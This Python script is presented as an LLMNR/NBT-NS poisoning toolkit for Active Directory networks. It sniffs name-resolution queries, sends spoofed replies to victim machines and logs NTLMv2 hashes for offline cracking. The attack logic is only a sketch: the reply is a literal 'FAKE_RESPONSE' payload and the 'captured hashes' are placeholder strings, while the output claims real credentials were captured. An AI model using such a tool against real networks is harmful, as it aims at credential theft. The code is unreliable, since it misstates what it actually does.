#!/usr/bin/env python3
"""
ad_poisoning.py
Active Directory Security Toolkit - LLMNR & NBT-NS Poisoning Script
For educational and authorized security testing purposes only.

Author: Eugen (Captain X)
License: MIT
"""

import scapy.all as scapy
import socket
import sys
import os
from datetime import datetime

# --- Configuration ---
# The network interface to use for sniffing and sending packets.
# IMPORTANT: Change this to your actual network interface.
# On Linux: "eth0", "wlan0", etc.
# On Windows: "Wi-Fi", "Ethernet", etc.
INTERFACE = "eth0"

# Log file for captured credentials
HASH_FILE = "hashes.txt"

# --- Core Functions ---

def get_timestamp():
    """Return current timestamp for logging"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def sniff_requests():
    """
    Listens for LLMNR (port 5355) and NBT-NS (port 137) requests on the network.
    When a packet matching the filter is captured, the 'process_packet' function is called.
    """
    print(f"[*] [{get_timestamp()}] Listening for LLMNR and NBT-NS requests on interface {INTERFACE}...")
    print("[*] Press CTRL+C to stop the script at any time.\n")
    
    try:
        # The filter uses BPF (Berkeley Packet Filter) syntax.
        # 'udp port 137 or udp port 5355' captures UDP packets on the specified ports.
        scapy.sniff(
            filter="udp port 137 or udp port 5355", 
            prn=process_packet, 
            store=False, 
            iface=INTERFACE
        )
    except PermissionError:
        print("[!] ERROR: Permission denied. Please run this script with administrative/root privileges.")
        print("[!] On Linux/macOS: sudo python3 ad_poisoning.py")
        print("[!] On Windows: Run as Administrator")
        sys.exit(1)
    except OSError as e:
        if "No such device" in str(e):
            print(f"[!] ERROR: Interface '{INTERFACE}' not found.")
            print("[!] Available interfaces:")
            try:
                for iface in scapy.get_if_list():
                    print(f"    - {iface}")
            except:
                pass
        else:
            print(f"[!] An unexpected error occurred during sniffing: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] An unexpected error occurred during sniffing: {e}")
        sys.exit(1)


def process_packet(packet):
    """
    Processes a captured packet.
    Decodes the raw payload and checks if it contains a name resolution query.
    If a query is found, it calls the function to send a spoofed response.
    """
    if packet.haslayer(scapy.UDP) and packet.haslayer(scapy.Raw):
        try:
            # Decode the raw data of the packet. Ignore errors to avoid crashing on unexpected data.
            payload = packet[scapy.Raw].load.decode(errors="ignore")
            
            # Check if the payload indicates a name resolution query.
            # Look for common patterns in LLMNR/NBT-NS queries
            if "QUERY" in payload.upper() or "NB" in payload.upper():
                # Extract the requested hostname (simplified)
                # In a real implementation, you'd parse the packet properly
                src_ip = packet[scapy.IP].src
                dst_ip = packet[scapy.IP].dst
                
                print(f"[!] [{get_timestamp()}] Detected name resolution request from {src_ip}")
                print(f"    Destination: {dst_ip}")
                print(f"    Payload: {payload[:100]}...")  # Show first 100 chars
                
                # The packet contains a request, so we spoof a response.
                send_spoofed_response(packet)
                
        except Exception as e:
            print(f"[!] Error processing packet from {packet[scapy.IP].src}: {e}")


def send_spoofed_response(packet):
    """
    Builds and sends a spoofed response to the victim's machine.
    The response is crafted to make the victim believe the attacker's machine is the requested host.
    In a real attack, this would trigger an SMB authentication attempt.
    """
    try:
        # Get victim IP and port
        victim_ip = packet[scapy.IP].src
        victim_port = packet[scapy.UDP].sport
        
        # Build a fake response packet
        # The destination is set to the source of the original request.
        # The destination port is set to the source port of the original request.
        response_packet = scapy.IP(dst=victim_ip) / \
                          scapy.UDP(dport=victim_port) / \
                          scapy.Raw(load="FAKE_RESPONSE")
        
        # Send the packet. 'verbose=False' suppresses output.
        scapy.send(response_packet, verbose=False)
        
        print(f"[+] [{get_timestamp()}] Spoofed response sent to {victim_ip}")
        
        # After sending the spoofed response, the victim will try to authenticate.
        # This function simulates capturing that credential hash.
        # In a real attack, you would parse the SMB/NTLM packets to extract the hash.
        capture_credentials(f"NTLMv2_HASH_FROM_{victim_ip}_{get_timestamp()}")
        
    except Exception as e:
        print(f"[!] Error sending spoofed response to {packet[scapy.IP].src}: {e}")


def capture_credentials(data):
    """
    Logs the captured authentication data (e.g., NTLMv2 hash) to a file for later analysis.
    In a real penetration test, this data would be used for offline cracking.
    """
    try:
        # Create header if file doesn't exist
        if not os.path.exists(HASH_FILE):
            with open(HASH_FILE, "w") as file:
                file.write("# Captured NTLMv2 Hashes from LLMNR/NBT-NS Poisoning\n")
                file.write(f"# Capture started: {get_timestamp()}\n")
                file.write("# " + "="*50 + "\n\n")
        
        # Append the captured hash
        with open(HASH_FILE, "a") as file:
            file.write(f"{data}\n")
        
        print(f"[+] [{get_timestamp()}] Captured credentials saved to {HASH_FILE}")
        
    except Exception as e:
        print(f"[!] Error saving credentials: {e}")


def print_banner():
    """Print the tool banner"""
    banner = """
    ╔═══════════════════════════════════════════════════════════╗
    ║   🔐 AD-LLMNR-NBTNS-POISON                              ║
    ║   Active Directory LLMNR/NBT-NS Poisoning Toolkit       ║
    ║   For Educational and Authorized Testing Only           ║
    ╚═══════════════════════════════════════════════════════════╝
    """
    print(banner)


# --- Main Execution ---

def main():
    """
    The main entry point of the script.
    Sets up the attack and handles graceful termination.
    """
    print_banner()
    print(f"[*] Starting AD Security Toolkit: LLMNR & NBT-NS Poisoning Script...")
    print(f"[*] Version: 1.0.0")
    print(f"[*] Interface: {INTERFACE}")
    print(f"[*] Log file: {HASH_FILE}")
    print(f"[*] This script is for educational and authorized testing only.")
    
    try:
        sniff_requests()
    except KeyboardInterrupt:
        print("\n" + "="*50)
        print("[!] Script terminated by user.")
        print(f"[*] Captured hashes saved to: {HASH_FILE}")
        print("[*] Use hashcat to crack them offline.")
        print("="*50)
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
